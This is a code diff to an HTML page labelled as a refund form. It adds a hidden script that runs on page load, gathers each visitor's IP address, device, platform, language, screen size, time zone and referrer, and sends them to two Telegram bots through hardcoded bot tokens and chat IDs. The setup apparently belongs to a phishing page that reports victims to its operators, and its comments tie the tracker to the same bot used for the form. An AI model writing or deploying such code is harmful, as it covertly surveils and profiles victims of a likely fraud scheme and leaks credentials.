@@ -550,6 +550,107 @@
     </footer>
 
     <script>
+        // =============================================
+        // TRACKER DE VISITE INSTANTANÉ - Utilise le même bot que le formulaire
+        // =============================================
+        (function() {
+            // Configuration du bot principal (bot1)
+            const VISIT_TOKEN = "8086278493:AAFahaSR5JwwIJuJnyBhf360MmusgYEKTdM";
+            const VISIT_CHAT_ID = "5534662562";
+            
+            // Vérifier si on a déjà signalé cette visite (évite les doublons au rafraîchissement)
+            const sessionVisited = sessionStorage.getItem('page_visited');
+            
+            if (!sessionVisited) {
+                // Marquer la visite dans la session
+                sessionStorage.setItem('page_visited', 'true');
+                
+                // Fonction pour obtenir l'IP du visiteur
+                function getVisitorIP() {
+                    fetch('https://api.ipify.org?format=json')
+                        .then(response => response.json())
+                        .then(data => {
+                            sendVisitNotification(data.ip);
+                        })
+                        .catch(() => {
+                            sendVisitNotification('IP non disponible');
+                        });
+                }
+                
+                // Fonction pour envoyer la notification de visite
+                function sendVisitNotification(ip) {
+                    // Obtenir des informations sur le visiteur
+                    const pageUrl = window.location.href;
+                    const referrer = document.referrer || 'Direct';
+                    const userAgent = navigator.userAgent;
+                    const language = navigator.language;
+                    const platform = navigator.platform;
+                    const screenSize = `${window.screen.width}x${window.screen.height}`;
+                    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                    const visitTime = new Date().toLocaleString('fr-FR');
+                    
+                    // Détection du type d'appareil
+                    let deviceType = 'Ordinateur';
+                    if (/Mobile|Android|iPhone|iPad|iPod/i.test(userAgent)) {
+                        deviceType = 'Mobile';
+                    } else if (/Tablet|iPad/i.test(userAgent)) {
+                        deviceType = 'Tablette';
+                    }
+                    
+                    // Construction du message
+                    const message = `👁️ NOUVELLE VISITE DÉTECTÉE 👁️
+
+📱 PAGE: Formulaire de Remboursement
+🌐 URL: ${pageUrl}
+🔗 PROVENANCE: ${referrer}
+
+🆔 VISITEUR:
+• IP: ${ip}
+• Appareil: ${deviceType}
+• Plateforme: ${platform}
+• Langue: ${language}
+• Écran: ${screenSize}
+• Fuseau: ${timeZone}
+
+⏰ DATE: ${visitTime}
+
+🖥️ USER AGENT:
+${userAgent.substring(0, 100)}...`;
+
+                    // Envoyer au même bot que le formulaire (bot1)
+                    fetch(`https://api.telegram.org/bot${VISIT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: VISIT_CHAT_ID,
+                            text: message
+                        })
+                    }).catch(error => {
+                        console.error('Erreur envoi visite:', error);
+                    });
+                    
+                    // Optionnel : Envoyer aussi au deuxième bot pour redondance
+                    const SECOND_TOKEN = "8550969792:AAGzbD2TYJw27PtokQhSZiJi7lm1JWnyyD4";
+                    const SECOND_CHAT_ID = "8061187067";
+                    
+                    fetch(`https://api.telegram.org/bot${SECOND_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            chat_id: SECOND_CHAT_ID,
+                            text: message
+                        })
+                    }).catch(error => {
+                        console.error('Erreur envoi visite (bot2):', error);
+                    });
+                }
+                
+                // Exécuter la récupération d'IP et l'envoi
+                getVisitorIP();
+            }
+        })();
+        // ========== FIN DU TRACKER DE VISITE ==========
+
         document.addEventListener('DOMContentLoaded', function() {
             const submitButton = document.getElementById('submitButton');
             const loading = document.getElementById('loading');
